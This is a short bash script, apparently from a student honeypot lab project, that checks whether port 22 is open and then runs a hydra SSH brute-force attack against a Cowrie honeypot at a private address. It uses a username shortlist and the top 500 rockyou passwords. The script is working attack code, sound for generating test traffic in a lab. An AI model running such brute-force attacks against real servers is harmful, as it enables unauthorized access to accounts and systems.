#!/bin/bash
# SSH brute force - targets Cowrie

COWRIE="172.16.0.20"
LOGDIR="/home/kali/Desktop/fyp/attack_scripts/logs/brute_force"
USERS="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
ROCKYOU="/usr/share/wordlists/rockyou.txt"

mkdir -p "$LOGDIR"
[ -f "$ROCKYOU.gz" ] && sudo gunzip "$ROCKYOU.gz" 2>/dev/null

echo "SSH brute force on $COWRIE"

if nc -zw2 "$COWRIE" 22 2>/dev/null; then
    head -500 "$ROCKYOU" > /tmp/pass_500.txt
    timeout 600 hydra -L "$USERS" -P /tmp/pass_500.txt -t 4 -o "$LOGDIR/ssh_${COWRIE}.txt" ssh://$COWRIE 2>/dev/null
    rm -f /tmp/pass_500.txt
else
    echo "SSH not open"
fi

echo "Done"
